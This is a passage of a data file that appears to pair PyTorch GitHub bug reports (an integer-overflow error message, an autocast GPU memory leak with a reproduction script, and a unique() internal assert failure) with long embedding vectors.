 -0.11524595  0.28455383 -0.4020462   0.08117107 -0.14027396 -0.00515289
 -0.15080363  0.17812315 -0.09099674  0.1087319  -0.08595236 -0.47455183
 -0.07671727 -0.02686815  0.20445922 -0.04639063 -0.17085883  0.10067265
 -0.1087945  -0.00859031 -0.18105653 -0.11039722  0.1611511   0.11433443
 -0.15926455 -0.11689273 -0.36889005  0.03461488  0.0638461   0.10728687
 -0.40914008 -0.3386454  -0.2017679  -0.04424577  0.04393239 -0.01317866
 -0.06599395  0.09061983 -0.29768276  0.20675941 -0.05187849  0.09010294
 -0.21519063  0.02353816 -0.19600901  0.2830635   0.01114322 -0.17404205
 -0.04080572 -0.20153035  0.12516752 -0.2386227  -0.10970418 -0.06459782
  0.05251158 -0.09097694 -0.10325571 -0.00422758  0.03941632  0.05340723
  0.11861715  0.00724619  0.40805167 -0.29928488  0.22253314 -0.06838724
 -0.5499513   0.23233946 -0.23623626  0.20686431 -0.3126355  -0.13166867
  0.05838919  0.12946983 -0.16999857 -0.21173197  0.13466573 -0.04063029
  0.00598296 -0.05658392  0.0805209  -0.15364735  0.12529603  0.3475065
  0.38761818  0.24284951  0.02762049  0.4975252   0.02289861  0.16465834
  0.15146138  0.262426   -0.25930664 -0.39077902  0.09188646 -0.1085877
 -0.18381682  0.27109063  0.14714283 -0.1933149   0.26353705  0.15951727
  0.3248636  -0.17093498 -0.01748997  0.14693597  0.11705462 -0.11656483
  0.13918424  0.12456584 -0.39500463  0.19536042 -0.31138927  0.24196234
  0.15730076  0.25596112 -0.04600162  0.02717027  0.39979428  0.20335895
  0.01861393  0.10397227 -0.07489333 -0.37053084  0.2661171   0.07479702
 -0.23975897 -0.18266101  0.14497817  0.287444   -0.13690346 -0.06507252
 -0.22139584 -0.25042677 -0.07717746 -0.07219193 -0.01976776 -0.4685321
  0.3384146   0.29115424 -0.3572251   0.1268945   0.01831287 -0.01907022
  0.1477933   0.31490654 -0.2494722   0.34972137 -0.24605568  0.13723053
  0.20162669  0.16695726  0.20318687 -0.43526995 -0.15223071  0.30227345
 -0.08186407 -0.23602541  0.36580342 -0.07224229 -0.10232416 -0.2569527
 -0.25487798  0.16480863 -0.18368272  0.05949623 -0.19316922 -0.59516525
  0.19199921 -0.02647392 -0.1862451  -0.20484729  0.20640966  0.01800372
  0.49256456  0.568234    0.09396727  0.21863684  0.06399291 -0.31393412
  0.01172338 -0.1274579   0.17796916  0.04924858 -0.15568833 -0.10636304
  0.60935175 -0.03996539  0.11664955 -0.33353046  0.02665078  0.22630563
  0.11494436 -0.0103274   0.17829008 -0.03220209 -0.0782606   0.19388899
 -0.21487758 -0.04638421 -0.24264865 -0.3033585   0.28604788 -0.05816504
 -0.2157512  -0.3376602  -0.31566262 -0.01315244 -0.06444093 -0.25248995
 -0.0578512   0.11195803 -0.02597726 -0.03363498  0.17668846 -0.00072084
  0.12023638 -0.2949209   0.06000843  0.01548359  0.03516087  0.14851747
  0.2280797   0.06655353  0.27084798 -0.00108086 -0.0666519   0.19795844
 -0.15675184  0.08073704 -0.01661115  0.20698433 -0.04890025  0.07635143
  0.051061    0.0351586   0.07599456 -0.25061718  0.0167096  -0.12725753
  0.07046553 -0.23341337 -0.17492235 -0.0360545  -0.3517096  -0.27773064
  0.40717268 -0.0605939   0.22546786  0.02744685  0.1256375   0.01451079
  0.01836776 -0.06012946 -0.02394273  0.00902663  0.25311598  0.369071
  0.20261374 -0.06857683 -0.1384905   0.03540322  0.18554127 -0.09366573
 -0.10239851  0.00767603  0.1918031  -0.02778838  0.12620273  0.03647532
  0.5719342   0.13937803  0.26456124 -0.10479419  0.30783308  0.28450257
 -0.2238206   0.16266784  0.3902793  -0.19258891  0.07535314 -0.21273488
 -0.09742007  0.0446045   0.11260914 -0.11224101  0.18130673 -0.07917757
 -0.04071188 -0.04501836  0.19974878 -0.01006425 -0.02988213  0.1981335
 -0.37763608 -0.00610416  0.16473663  0.08784448 -0.5074862  -0.04220234
  0.34099764  0.02668435  0.15555099 -0.2553783   0.3241094   0.17214093
 -0.27782702  0.10354508 -0.12473199 -0.1580266   0.05322982  0.250811
  0.1444085  -0.02144164 -0.29466507 -0.36066124  0.08667136  0.15331164
  0.30938613  0.16437943 -0.21318649  0.36262512 -0.06389672  0.2499114
  0.32145175 -0.08590516  0.01747284  0.13780078  0.09480532 -0.2784114
 -0.2143288   0.28272468 -0.10419692 -0.20496449 -0.08698913 -0.20974414
 -0.05550712 -0.3723126  -0.13278598 -0.06575557  0.09309073  0.5443046
 -0.02475197 -0.18916632  0.04782763 -0.04709143  0.03767812 -0.12673739
 -0.08210239  0.6091337  -0.06906226 -0.02707232  0.00665167  0.12515877
 -0.11903858  0.1867984  -0.39888796  0.1288994   0.20859483 -0.00299301
 -0.02973718  0.26094863  0.19103064  0.04931872 -0.2931798  -0.0947946
 -0.01653857  0.3050517   0.12568833 -0.27483922 -0.10359831 -0.00901498
  0.08877391  0.20845833  0.03462696 -0.03027578 -0.03215268 -0.11215277]"
Bad error message when int overflows module: docs module: internals triaged,"```
>>> import torch
>>> torch.empty(2 * 10 ** 20)
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
TypeError: empty(): argument 'size' must be tuple of ints, but found element of type int at pos 1
```

I'd expect it to tell me overflow has happened.

BTW, Python still thinks this is an int:

```
>>> print(2 * 10 ** 20)
200000000000000000000
```

cc @jlin27 @mruberry @ezyang @bhosmer @smessmer @ljk53 @bdhirsh @ailzhang",True,"[-1.32685617e-01 -2.41931215e-01 -2.81051457e-01  1.57883912e-01
 -1.48157375e-02 -4.33888167e-01 -1.49004728e-01  3.97170484e-01
 -4.07875955e-01 -2.26116225e-01 -2.63827026e-01 -1.15462951e-01
 -5.05786419e-01  1.41843051e-01 -4.31582257e-02 -2.04409450e-01
 -4.08937246e-01 -4.74729866e-01 -1.18852615e-01  4.00374644e-04
  2.47081444e-02  3.87868792e-01 -1.88361034e-01  1.98047087e-02
 -8.90242681e-03  2.76724517e-01 -1.43304110e-01 -1.81513309e-01
  7.51190186e-02  5.56771457e-02  8.51803720e-02 -1.34099841e-01
 -1.38502449e-01  1.46508709e-01  3.32781851e-01 -9.65556204e-02
 -1.46723032e-01 -7.78917745e-02 -8.49460661e-02  1.20927662e-01
  1.89369678e-01  2.91212082e-01 -1.47532344e-01  7.07225576e-02
  3.03712994e-01 -1.57969669e-01 -3.20599437e-01  7.90339261e-02
  2.09253076e-02 -1.54852957e-01  4.07944620e-03  3.65727663e-01
 -2.68685799e-02  1.75516814e-01 -3.43339920e-01 -3.97098780e-01
 -2.35342309e-01  1.67466730e-01 -6.22708052e-02 -1.78745821e-01
  1.98997229e-01  1.24171332e-01  3.56886208e-01 -1.82062790e-01
  2.36224383e-04 -6.57253340e-02  1.10682882e-01  1.71901643e-01
  1.55560955e-01  3.63825774e-03  9.87990275e-02  1.33365482e-01
 -4.42565352e-01 -1.09571576e-01  3.06571890e-02  1.71740800e-01
 -3.60371232e-01 -5.27467392e-02 -1.52417541e-01 -4.88523021e-02
  2.59504896e-02  5.17420396e-02  1.63292468e-01  2.28450269e-01
  2.93011628e-02  1.04906216e-01 -5.24197109e-02 -8.52253139e-02
  3.86305451e-01  2.43348271e-01  1.51706055e-01  6.58889413e-02
 -1.46084100e-01  7.55300641e-01  1.99255750e-01 -1.13727391e-01
  2.86983550e-01 -2.65649799e-02 -4.41385001e-01 -3.02496880e-01
  5.47631606e-02 -1.15273573e-01 -1.97355524e-02  2.42506992e-03
  3.38801026e-01  3.65196407e-01  3.11230808e-01  4.08149213e-01
  4.87472087e-01 -2.19803244e-01  5.63276291e-01 -1.96474016e-01
  2.67442346e-01 -1.77460581e-01 -8.88803974e-02 -7.81378597e-02
 -8.61154795e-02  1.71199024e-01 -5.85163713e-01  3.88739407e-01
  8.64157230e-02  2.46902853e-01 -2.18272731e-01  2.81233221e-01
  1.76507324e-01 -5.57495058e-02 -1.31048327e-02 -2.62424611e-02
 -1.60463810e-01  3.33124138e-02  2.66477287e-01  1.34878084e-02
 -2.91810006e-01  6.88105961e-03  3.77095431e-01  6.12407446e-01
 -4.82818335e-01 -7.85729438e-02 -3.96930426e-01 -7.32234269e-02
 -1.11012042e-01 -4.74222273e-01 -2.67261297e-01 -4.69803751e-01
  1.16529167e-01  1.61106974e-01 -2.08697319e-01 -9.15795416e-02
 -1.74315348e-02 -2.06558451e-01 -2.42133990e-01 -1.96196407e-01
 -2.19056085e-01  2.46236250e-01 -1.91245839e-01 -1.06902406e-01
  1.16125882e-01 -7.13477582e-02  2.41267398e-01 -5.97308278e-01
 -3.93425450e-02  2.84702688e-01  2.20918562e-02  1.12231933e-01
  3.03436488e-01 -5.58945015e-02 -3.09224010e-01 -1.10753126e-01
 -5.91399014e-01  2.69964454e-03  9.40559059e-02 -1.28728479e-01
 -8.71791542e-02 -2.58557916e-01  1.48906395e-01  6.68268427e-02
 -3.07197750e-01 -2.17099279e-01 -1.89279504e-02  2.71149993e-01
  2.20133618e-01  5.31267643e-01  1.39190838e-01  3.20082277e-01
  3.13900113e-02  7.24359825e-02 -1.10986635e-01  7.95226023e-02
  2.62616426e-01  1.62061602e-01  2.59818956e-02 -2.02192605e-01
 -3.08408618e-01 -9.44916904e-02  1.40022814e-01  2.48636097e-01
 -1.56187890e-02  1.44987613e-01 -6.02667145e-02  1.56261504e-01
 -3.14613491e-01  1.77607700e-01 -9.73458737e-02 -3.35007608e-02
  1.56773314e-01 -8.25165659e-02  5.32626361e-02 -9.26050842e-02
 -6.81446791e-02 -1.82589769e-01 -1.16255030e-01 -2.16340199e-02
 -3.10291618e-01 -2.15941548e-01 -1.61112651e-01  9.01155770e-02
  2.48889089e-01 -5.88175841e-03  1.12465553e-01 -1.31934911e-01
  1.04811758e-01 -1.27652019e-01 -6.95686489e-02 -3.29559505e-01
  3.41727823e-01 -1.60006464e-01 -1.63035765e-01 -7.44927451e-02
 -1.55558884e-01  9.77569371e-02  2.95566767e-02  2.87190437e-01
  2.48717040e-01  7.52985626e-02  3.15135568e-02  6.98576331e-01
 -4.14649211e-03  3.25496271e-02  1.52698487e-01  7.43838996e-02
 -1.65734619e-01  2.66119279e-03  2.52199978e-01 -7.40252733e-02
  3.16845849e-02 -9.60682929e-02 -6.12322241e-03 -2.67367661e-01
 -1.45380110e-01  3.03680301e-01 -2.85728812e-01 -1.42710716e-01
  2.89670646e-01 -2.23675221e-01  4.03470635e-01 -2.08328068e-02
  1.53938428e-01  2.57197380e-01 -1.73829019e-01 -4.72905859e-02
 -5.76568097e-02 -2.54153833e-02  1.17235944e-01 -1.67681307e-01
 -1.43130571e-02 -1.36917289e-02 -1.02356181e-01  3.36719692e-01
  5.81162609e-02  9.46111158e-02  3.16555858e-01  2.54871529e-02
  4.49351013e-01 -6.19705766e-02 -9.10049379e-02 -1.89019352e-01
  3.33132237e-01  3.64703029e-01  3.02763373e-01 -7.23117962e-02
  3.57142836e-02  1.90515459e-01 -2.04456925e-01 -1.31539717e-01
  8.21338415e-01 -3.54828477e-01  1.20042618e-02  8.08194578e-02
 -2.19707012e-01 -3.06620032e-01 -1.50425375e-01 -1.75594077e-01
  2.29837254e-01 -5.37474863e-02  3.35466057e-01  2.17231810e-01
 -1.16608351e-01  3.38241309e-02 -4.97008935e-02  3.96649122e-01
  3.28227878e-04 -5.97128794e-02 -2.01156493e-02 -6.92009553e-03
 -2.19343215e-01  9.73626226e-02 -1.14912950e-01  2.03635450e-02
  5.83843589e-01 -1.32693216e-01  1.92578614e-01  2.29996443e-01
 -4.91127014e-01  4.93788898e-01 -2.70176023e-01  5.27741127e-02
 -5.75683489e-02  2.86368161e-01  1.17006570e-01 -1.38222545e-01
 -4.02267635e-01 -4.32574809e-01 -2.96826929e-01  8.34912714e-03
  1.67807847e-01 -1.14353716e-01 -3.73511255e-01  4.58577931e-01
 -2.78686166e-01  3.47543627e-01  8.31702352e-02  4.57965061e-02
  1.09652638e-01 -2.78024435e-01  1.33035839e-01 -1.27135262e-01
 -1.35698259e-01  5.04300371e-02  1.43685322e-02 -1.99499242e-02
 -1.21893309e-01 -2.26215839e-01 -1.16630584e-01 -2.29800880e-01
 -6.57524467e-02 -3.12374681e-01  3.33551705e-01  4.38095570e-01
 -7.12303966e-02 -3.16146851e-01  2.36783102e-01  7.04786703e-02
  9.36469585e-02  2.04352662e-01 -2.02304885e-01  5.40299773e-01
  2.32178837e-01  2.12944299e-01 -2.24501193e-01  2.33320266e-01
 -3.28606069e-01 -2.21098289e-01 -3.89543414e-01 -2.02986211e-01
  4.56898138e-02 -4.36787941e-02  1.14051238e-01  4.43545163e-01
 -1.13979399e-01 -7.09950849e-02 -7.38420784e-02 -4.86923009e-02
 -1.49188414e-01  3.50744575e-01  2.00452045e-01 -1.79365695e-01
 -7.15144575e-02  4.24242392e-02 -1.38078615e-01  2.71883070e-01
  2.05808759e-01  2.97796607e-01  1.18506119e-01 -6.98173046e-02]"
native amp consumes 10x gpu memory  high priority triaged module: amp (automated mixed precision),"## ðŸ› Bug

observation: pytorch native amp consumes 10x memory as compared to fp16/apex or no `--fp16` usage.

The issue has been originally discovered and tracked at https://github.com/huggingface/transformers/issues/8403 and on slack, but now we know for sure that this is a pytorch issue, so let's concentrate the discussion here.

## To Reproduce

What's following is the minimal script that was reduced from a rather complex logic of `finetune.py` in `transformers`. It originates in a complex stack of `pytorch-lightning` feeding `transformers` generate/beam_search logic finally feeding to real pytorch logic in `BartForConditionalGeneration`. If you want to see the full blow up and how to set it up, it's described [here](https://github.com/huggingface/transformers/issues/8403).

I found at least part of the culprit or trigger of the leak - it's `@torch.no_grad()` used for `generate` https://github.com/huggingface/transformers/blob/eb3bd73ce35bfef56eeb722d697f2d39a06a8f8d/src/transformers/generation_utils.py#L281-L282

Here is a short script that reproduces the leakage. It removes all the generate/search logic and feeds the same random `input_ids` to `BartForConditionalGeneration` pre-trained model.

Please first run:
```
pip install ipyexperiments 
```
to get the memory tracing, but feel free to disable it if for some reason it's not working for you and use some alternative like `nvidia-smi` dumping. (but it should work)

```python
#!/usr/bin/env python

import os
import sys
import torch
os.environ[""USE_TF""] = ""0""
sys.path.insert(1, ""src"")

# !pip install ipyexperiments 
from ipyexperiments.utils.mem import gpu_mem_get_used_mbs, gpu_mem_get_used_no_cache_mbs

from transformers import BartForConditionalGeneration

device = torch.device('cuda:0' if torch.cuda.is_available() else 'cpu')

model = BartForConditionalGeneration.from_pretrained('sshleifer/student_cnn_12_6').to(device)
model.eval()

vocab_size = 50264 # model.config.vocab_size
length = 10

AUTOCAST = False if ""-f"" in sys.argv else True
print(f""autocast: {AUTOCAST}"")

class MemReport():
    def __init__(self, gc_collect=True):
        self.get_mem = gpu_mem_get_used_no_cache_mbs if gc_collect else gpu_mem_get_used_mbs
        self.cur = self.get_mem()
    def delta(self, id):
        peak = torch.cuda.memory_stats()[""allocated_bytes.all.peak""]
        print(f""{id}: {gpu_mem_get_used_mbs()-self.cur}MB (peak {peak>>20}MB)"")
        self.cur = self.get_mem()
        
mr = MemReport(gc_collect=False)

### reproducible code starts here ###

@torch.no_grad()
def logic():
    input_ids = torch.randint(vocab_size, (1,length)).to(device)
    mr.delta(0)
    for i in range(1,10):
        outputs = model(input_ids)
        mr.delta(i)

if AUTOCAST:
    with torch.cuda.amp.autocast():
        logic()
else:
    logic()
```

So if I run it with `-f` which disables `autocast`, I get:

```
./reproduce.py -f
autocast: False
0: 0MB (peak 1165MB)
1: 12MB (peak 1167MB)
2: 0MB (peak 1169MB)
3: 0MB (peak 1169MB)
4: 0MB (peak 1169MB)
5: 0MB (peak 1169MB)
6: 0MB (peak 1169MB)
7: 0MB (peak 1169MB)
8: 0MB (peak 1169MB)
9: 0MB (peak 1169MB)
```
no leak.

If however I remove `-f` and `autocast` gets enabled, we get:
```
./reproduce.py
autocast: True
0: 0MB (peak 1165MB)
1: 592MB (peak 1744MB)
2: 580MB (peak 2324MB)
3: 580MB (peak 2902MB)
4: 580MB (peak 3480MB)
5: 580MB (peak 4058MB)
6: 580MB (peak 4636MB)
7: 580MB (peak 5214MB)
8: 580MB (peak 5793MB)
9: 580MB (peak 6371MB)
```
the memory logger prints the delta for each `forward` call in the loop and the peak memory.

You can see that we are leaking 600Mb per forward call here.

If I comment out `@torch.no_grad()`, the total memory usage doubles but there is no leak:

```
autocast: True
0: 0MB (peak 1165MB)
1: 602MB (peak 1754MB)
2: 590MB (peak 2343MB)
3: 0MB (peak 2343MB)
4: 0MB (peak 2343MB)
5: 0MB (peak 2343MB)
6: 0MB (peak 2343MB)
7: 0MB (peak 2343MB)
8: 0MB (peak 2343MB)
9: 0MB (peak 2343MB)
```

I was using pycharm to debug this and to write a small script and boy it got me so delayed as it leaks gpu ram on its own, since it has to save all those variables on cuda, but I wasn't aware of it. Well, now I know not to do that. Luckily I had https://github.com/stas00/ipyexperiments handy to give me easy memory tracing.

Note I'm importing two gpu mem tracking functions - one of them clears cuda cache - but here it appears it's better not use that version. 

## Expected behavior

Shouldn't consume 10x gpu memory (apex does not).

## Environment

```
Collecting environment information...
PyTorch version: 1.8.0.dev20201115+cu110
Is debug build: False
CUDA used to build PyTorch: 11.0
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.1 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
Clang version: Could not collect
CMake version: version 3.16.3

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration:
GPU 0: GeForce RTX 3090
GPU 1: GeForce GTX 1070 Ti

Nvidia driver version: 455.32.00
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5
/usr/lib/x86_64-linux-gnu/libcudnn.so.8.0.4
/usr/lib/x86_64-linux-gnu/libcudnn_adv_infer.so.8.0.4
/usr/lib/x86_64-linux-gnu/libcudnn_adv_train.so.8.0.4
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_infer.so.8.0.4
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_train.so.8.0.4
/usr/lib/x86_64-linux-gnu/libcudnn_ops_infer.so.8.0.4
/usr/lib/x86_64-linux-gnu/libcudnn_ops_train.so.8.0.4
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.4
[pip3] pytorch-lightning==1.0.4
[pip3] pytorch-memlab==0.2.2
[pip3] torch==1.8.0.dev20201115+cu110
[pip3] torchtext==0.6.0
[pip3] torchvision==0.9.0.dev20201115+cu110
[conda] numpy                     1.19.4                   pypi_0    pypi
[conda] pytorch-lightning         1.0.4                     dev_0    <develop>
[conda] pytorch-memlab            0.2.2                    pypi_0    pypi
[conda] torch                     1.8.0.dev20201115+cu110          pypi_0    pypi
[conda] torchtext                 0.6.0                    pypi_0    pypi
[conda] torchvision               0.9.0.dev20201115+cu110          pypi_0    pypi
```

@mcarilli, @ptrblck 

cc @ezyang @gchanan @zou3519 @bdhirsh @mcarilli",True,"[ 6.49584234e-02  3.61647531e-02 -3.02739024e-01 -1.93543270e-01
 -2.59408474e-01 -4.67709392e-01 -6.75312281e-02  5.47318980e-02
 -1.82961866e-01 -4.31166328e-02 -2.41872501e-02  1.56660527e-01
 -9.78956744e-02  1.04539230e-01 -7.84170441e-03 -1.23131182e-02
 -1.05199091e-01 -2.36307532e-01  4.26571220e-02 -1.01075321e-01
  1.22449659e-01  1.76407278e-01 -1.88397661e-01  1.48620546e-01
 -3.55512872e-02  1.44377112e-01  2.08219379e-01 -4.09809388e-02
  5.76071739e-02 -1.07697681e-01  1.73067182e-01  1.46889031e-01
  1.49618983e-01 -2.27395833e-01  2.08162330e-03 -2.67703682e-02
 -2.30589330e-01 -3.81489635e-01 -2.36847878e-01 -2.25822881e-01
  1.78479284e-01  3.23104560e-01 -8.12628418e-02  1.96193665e-01
 -2.57709235e-01  7.62151089e-03 -3.41015100e-01  1.06670901e-01
 -3.16164255e-01 -8.29689577e-02 -1.52921811e-01  4.12189215e-02
 -1.18551813e-01 -1.31667495e-01  1.87187091e-01 -2.06187844e-01
 -1.61890030e-01  4.13839184e-02 -1.51898563e-01  5.33092543e-02
 -2.20162775e-02 -1.81348935e-01  9.07421410e-02 -7.02633262e-02
 -1.15762994e-01 -2.73044053e-02  2.21026376e-01 -7.55925253e-02
  2.37057790e-01  1.60667934e-02 -1.59946844e-01  1.41378641e-01
 -3.12046587e-01 -2.30171785e-01  1.19774386e-01  2.48906508e-01
 -2.34335810e-01  1.31509811e-01  9.67159122e-02 -2.02489153e-01
 -1.01682935e-02  3.86225469e-02  4.79451194e-03 -3.54829311e-01
  1.51089475e-01  6.21662885e-02 -2.85535157e-02 -8.13197531e-03
 -2.59587824e-01 -9.57442075e-02  2.84481943e-01  1.30188465e-01
 -4.28554825e-02 -3.72717902e-02  2.85057306e-01  2.42354482e-01
 -7.23665534e-03 -4.32136506e-02 -1.19864091e-01 -2.42479533e-01
 -5.37252091e-02  8.00617039e-02 -2.73470283e-01  2.13502228e-01
 -3.71781111e-01 -2.63840735e-01 -6.20102622e-02  5.29404521e-01
  6.52073100e-02 -2.47470569e-02  2.79693604e-01  1.05993159e-01
  4.76670749e-02  3.29064786e-01  2.07752392e-01  1.39559656e-01
  4.05793339e-02 -7.88917206e-03 -1.51274353e-02  1.24500766e-01
 -2.95453548e-01 -2.96577394e-01 -3.22540969e-01  1.84497368e-02
 -4.36417758e-05  2.39959151e-01  8.79935324e-02  1.64794132e-01
  8.31711069e-02  2.69794427e-02  3.69766429e-02 -1.98476434e-01
  1.73060689e-02 -2.07925946e-01  2.46979386e-01  1.24323785e-01
 -1.70246303e-01 -2.30403468e-01 -6.02102205e-02  1.83821656e-02
  2.60623664e-01  1.50336236e-01 -5.96564785e-02 -3.24239016e-01
 -7.73075074e-02  5.95867991e-01 -1.75586671e-01 -6.50208592e-02
  8.17598701e-02  1.77665189e-01  3.29076238e-02 -1.28135026e-01
 -1.30995631e-01  5.18219590e-01 -9.38748419e-02 -9.37951356e-02
  3.98347154e-02 -5.19168377e-02 -5.88524565e-02 -5.98592088e-02
 -3.53598297e-01  2.16933697e-01  1.40208036e-01 -3.37593034e-02
  2.27490440e-01  1.00964010e-01 -2.99694657e-01 -2.64999568e-01
  2.42133528e-01  2.37485729e-02 -2.75798827e-01  9.11751539e-02
 -3.39608453e-02 -3.75412107e-01  3.83376360e-01 -3.86015140e-03
  4.12988998e-02  1.31821796e-01 -2.82334723e-02  1.06971100e-01
 -1.74064547e-01  2.81216413e-01  1.47988647e-01  1.59793854e-01
 -1.10661566e-01 -5.68706207e-02  2.89044827e-01  1.86431080e-01
 -8.20541605e-02  1.01199336e-01 -5.26418984e-02  4.41916436e-02
  8.31596553e-02 -1.90627918e-01 -4.63036411e-02 -3.29550207e-01
  1.22164845e-01  4.30618107e-01  2.55059034e-01  1.50420576e-01
  5.97307235e-02 -1.38590649e-01  2.50899997e-02  4.12193298e-01
  2.48625159e-01  1.52203560e-01 -2.56405473e-01 -9.65196937e-02
  3.98891084e-02  1.17459580e-01 -2.03398719e-01 -1.60843402e-01
 -9.64064822e-02 -1.61622956e-01 -1.22598588e-01 -4.78866249e-02
  1.77095830e-03 -1.22411020e-01  1.52562752e-01  3.03057969e-01
  1.59023516e-02 -2.77275860e-01 -1.89658403e-01 -3.44910145e-01
  2.82743067e-01  1.52139649e-01  6.43336400e-02  1.73246130e-01
 -2.38452703e-02  8.04273188e-02  4.80889939e-02 -1.72239751e-01
  2.77829587e-01 -2.64711201e-01 -2.74014045e-02  4.24391598e-01
  1.81021467e-01 -4.32514027e-02  1.28406614e-01 -2.08961330e-02
 -7.57231340e-02 -3.77853096e-01  1.93939954e-02 -1.17481396e-01
 -1.47198632e-01 -2.92665102e-02  3.72351743e-02 -1.18649080e-02
 -2.15606913e-02  1.23242497e-01 -1.47707490e-02 -2.37734884e-01
  1.97026372e-01 -2.29337234e-02  2.09653497e-01 -6.53403550e-02
  2.77441889e-02 -2.42217734e-01  5.97265661e-02 -3.11680198e-01
  1.82997435e-01  4.91841346e-01 -2.66774110e-02  3.73038769e-01
  1.33783326e-01  1.10724084e-01 -1.65679932e-01  2.97172278e-01
 -5.19632399e-02 -1.71589613e-01  1.16902418e-01  1.22608878e-02
  1.91451505e-01  5.40130492e-03  5.82633376e-01 -2.33568579e-01
  3.08816403e-01 -2.43749186e-01  3.48813832e-02 -3.84393521e-02
  3.23445499e-01  2.05956995e-01 -4.23224736e-03  4.18135375e-02
  2.94751525e-01 -2.62210399e-01 -2.62875319e-01 -5.99095702e-01
 -2.09822088e-01 -5.00329286e-02  1.38011470e-01 -5.94506599e-02
  3.00737411e-01  1.46907836e-01  2.10621208e-01  7.09175020e-02
  8.84258822e-02 -1.51266068e-01 -6.45416901e-02  7.68783540e-02
 -3.89711350e-01  8.20617229e-02  2.75162548e-01  3.95688027e-01
 -4.67737824e-01  3.39204967e-01 -1.45066679e-01 -6.72449172e-02
  5.01881123e-01 -1.99619532e-01  8.59200582e-02  3.48578721e-01
 -5.61999604e-02  1.03321895e-01 -3.16546142e-01  9.55236778e-02
 -3.66047919e-01  5.41993976e-01  3.49157974e-02  5.13268746e-02
  5.15126530e-03 -2.59975255e-01 -3.22758585e-01  4.89550263e-01
  3.03672314e-01 -7.14004040e-02 -9.03556198e-02  1.92227643e-02
 -1.12497576e-01  1.31417140e-01  3.09963822e-01 -2.19807014e-01
  1.26879187e-02  4.42214422e-02  4.64466102e-02 -6.80433437e-02
  9.63566378e-02  1.56799741e-02 -1.23133153e-01 -1.61032572e-01
 -3.05797637e-01 -3.36779654e-03  2.10088402e-01 -2.78717995e-01
 -5.64306155e-02 -2.72188988e-02  4.26376164e-01  4.00837094e-01
 -1.30285442e-01 -2.08129808e-01 -9.31800306e-02  7.06988126e-02
 -2.57595152e-01 -1.12374529e-01 -1.74626827e-01  6.71128184e-02
 -5.59773296e-03  3.60272169e-01  1.06457040e-01  2.48095065e-01
 -3.35860610e-01 -1.39261857e-01 -2.76308000e-01  1.04800746e-01
 -2.41687670e-01 -5.55627346e-02 -1.27700761e-01  2.46516056e-03
  4.69261967e-03  3.95719051e-01  1.78039391e-02  2.33738109e-01
 -2.25170553e-01  1.09615885e-01  1.54729545e-01 -3.44458371e-02
  4.00633141e-02 -2.65201449e-01 -2.77592510e-01  1.99973807e-02
 -5.16992472e-02  3.50066185e-01 -2.02298053e-02 -1.20154321e-01]"
INTERNAL ASSERT FAILED for `S.unique().shape` high priority module: autograd triaged module: regression,"## ðŸ› Bug

<!-- A clear and concise description of what the bug is. -->

## To Reproduce
The stacktrace is
```
  File ""/home/ezheltonozhskii/dense_c3dpo/model.py"", line 122, in get_optimal_view
    if S.unique().shape != S.shape: 
  File ""/opt/conda/lib/python3.7/site-packages/torch/tensor.py"", line 519, in unique
    return torch.unique(self, sorted=sorted, return_inverse=return_inverse, return_counts=return_counts, dim=dim)
  File ""/opt/conda/lib/python3.7/site-packages/torch/_jit_internal.py"", line 267, in fn
    return if_false(*args, **kwargs)
  File ""/opt/conda/lib/python3.7/site-packages/torch/_jit_internal.py"", line 267, in fn
    return if_false(*args, **kwargs)
  File ""/opt/conda/lib/python3.7/site-packages/torch/functional.py"", line 768, in _return_output
    output, _, _ = _unique_impl(input, sorted, return_inverse, return_counts, dim)
  File ""/opt/conda/lib/python3.7/site-packages/torch/functional.py"", line 683, in _unique_impl
    return_counts=return_counts,
RuntimeError: isDifferentiableType(variable.scalar_type()) INTERNAL ASSERT FAILED at ""/pytorch/torch/csrc/autograd/functions/utils.h"":64, please report a bug to PyTorch.
```
I can't share exact code but I have different behaviour depending on whether all elements of tensor are unique in spirit of
```py
if S.unique().shape != S.shape: 
  return x
return y
```

## Expected behavior

The code works or raises exception.

## Environment

You can get the script and run it with:
```
PyTorch version: 1.8.0.dev20201024+cu110
Is debug build: True
CUDA used to build PyTorch: 11.0
ROCM used to build PyTorch: N/A

OS: Debian GNU/Linux 9.13 (stretch) (x86_64)
GCC version: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
Clang version: Could not collect
CMake version: Could not collect

Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration: GPU 0: A100-SXM4-40GB
Nvidia driver version: 450.51.06
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] efficientnet-pytorch==0.6.3
[pip3] numpy==1.18.5
[pip3] numpydoc==1.1.0
[pip3] pytorch3d==0.2.5
[pip3] segmentation-models-pytorch==0.1.2
[pip3] torch==1.8.0.dev20201024+cu110
[pip3] torchvision==0.8.0.dev20201024+cu110
[conda] efficientnet-pytorch      0.6.3                    pypi_0    pypi
[conda] mkl                       2019.5                      281    conda-forge
[conda] mkl-service               2.3.0            py37h516909a_0    conda-forge
[conda] mkl_fft                   1.1.0            py37hc1659b7_1    conda-forge
[conda] mkl_random                1.1.0            py37hb3f55d8_0    conda-forge
[conda] numpy                     1.16.5           py37h95a1406_0    conda-forge
[conda] numpy-base                1.18.5           py37h2f8d375_0  
[conda] numpydoc                  1.1.0              pyh9f0ad1d_0    conda-forge
[conda] pytorch3d                 0.2.5                    pypi_0    pypi
[conda] segmentation-models-pytorch 0.1.2                    pypi_0    pypi
[conda] torch                     1.8.0.dev20201024+cu110          pypi_0    pypi
[conda] torchvision               0.8.0.dev20201024+cu110          pypi_0    pypi
```



cc @ezyang @gchanan @zou3519 @bdhirsh @albanD @gqchen @pearu @nikitaved",True,"[-0.42612916 -0.19084547 -0.02505015 -0.13576302 -0.01532601 -0.1998331
 -0.05836475  0.01391216 -0.3766248  -0.09170865 -0.00158771  0.09060667
  0.26819202 -0.04536147 -0.1568674   0.2695707  -0.04329984 -0.17846471
